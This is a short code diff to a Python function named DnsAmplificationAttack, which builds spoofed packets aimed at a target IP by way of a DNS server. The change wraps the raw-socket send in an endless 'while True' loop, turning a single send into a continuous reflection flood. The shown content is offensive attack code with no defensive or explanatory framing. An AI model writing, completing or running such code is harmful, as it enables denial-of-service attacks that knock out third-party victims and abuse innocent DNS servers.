@@ -74,7 +74,8 @@ def DnsAmplificationAttack(trgt_ip, trgt_p, dns_srv, dns_p, dns_record):
 	#create a raw socket
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-		s.sendto(packet, (dns_srv, 0))
+		while True:
+			s.sendto(packet, (dns_srv, 0))
 	except socket.error , msg:
     		print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
 
